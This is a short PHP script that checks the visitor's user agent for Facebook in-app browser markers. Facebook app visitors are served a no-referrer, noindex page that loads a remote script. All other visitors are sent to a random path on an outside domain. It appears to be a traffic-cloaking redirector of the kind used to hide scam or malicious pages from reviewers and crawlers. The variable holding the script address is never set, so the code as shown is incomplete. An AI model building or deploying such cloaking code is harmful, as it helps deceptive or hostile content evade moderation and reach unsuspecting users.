<?php
header('X-Robots-Tag: noindex, nofollow');
header('Referrer-Policy: no-referrer');
header('Content-Type:text/html');

$myString = $_SERVER["HTTP_USER_AGENT"];
$fbApp = array('FBAN','FBAV','FBMD', 'FBSN', 'FBSV','FBID', 'FBSS', 'FBOP');
$iphoneMobile = array('iOS', 'iphone', 'iPhone', 'ios');
$androidMobile = array('android', 'Android');

function strpos_arr($string, $needle) {
    if(!is_array($needle)) $needle = array($needle);
    foreach($needle as $what) {
        if(($pos = strpos($string, $what))!==false) return 'SUCCESS';
    }
    return 'FAIL';
}

if(strpos_arr($myString, $fbApp) == 'SUCCESS'){
$redi = json_encode($url, JSON_HEX_QUOT|JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS); 

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
echo '
<html>
<head>
<meta http-equiv="cache-control" content="no-cache">
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="index">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
</head>
<body>
<script src="'.$url.'" type="text/javascript" async="true"></script>
</body>
</html>';
}


else{
$urlx1 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
header("location: $urlx1", true, 200);
die();
}
?>